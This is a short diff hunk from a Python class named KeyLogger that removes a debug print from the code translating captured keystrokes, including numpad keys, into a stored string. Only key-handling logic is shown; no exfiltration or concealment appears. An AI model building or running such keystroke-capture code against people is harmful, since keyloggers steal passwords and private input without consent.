@@ -42,7 +42,6 @@ class KeyLogger:
                 if 96 <= key.vk <= 105:
                     KeyLogger.keys += "<numpad:" + chr(key.vk - 48) + ">"
                 else:
-                    print(key.vk, chr(key.vk))
                     KeyLogger.keys += chr(key.vk)
             else:
                 if ord(key.char) < 32: 
